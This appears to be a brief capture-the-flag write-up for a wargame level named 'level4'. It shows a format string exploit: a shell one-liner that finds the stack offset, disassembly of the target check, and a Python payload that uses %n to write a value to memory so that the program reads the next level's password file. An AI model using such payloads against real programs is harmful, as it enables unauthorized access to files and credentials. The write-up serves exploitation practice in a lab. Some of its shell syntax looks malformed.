Format string exploit

calculate the offset

EXEC=level4; python -c 'print "AAAA " + "%x " * 99  ' > /tmp/t1 && cat /tmp/t1 - | ./$EXEC > /tmp/t2 | awk -F "41414141" '{print $1}' <<< cat /tmp/t2 > /tmp/t3 && echo "Offset = " &&  awk '{print gsub("[ ]",""+1); exit}' <<< cat /tmp/t3 && rm -rf /tmp/t1 /tmp/t2 /tmp/t3

offset = 12

In the dump, we can see the cmp of eax with 0x1025544, to call system("/bin/cat /home/user/level5/.pass")

0x8048492:   3d 44 55 02 01            	cmp eax, 0x1025544
0x8048497:   75 0c                     	jne 0x80484a5 <n+0x4e>
0x8048499:   c7 04 24 90 85 04 08      	mov dword ptr [esp], 0x8048590 ; "/bin/cat /home/user/level5/.pass"

The address of the value in eax is 0x8049810

0x804848d:   a1 10 98 04 08            	mov eax, dword ptr [0x8049810]
0x8048492:   3d 44 55 02 01            	cmp eax, 0x1025544

We will write the value 0x1025544 in decimal 16930116 at the address 0x8049810

python -c 'print "\x08\x04\x98\x10"[::-1]+"%16930112d" + "%12$n"' > /tmp/ex4 && cat /tmp/ex4 - | ./level4
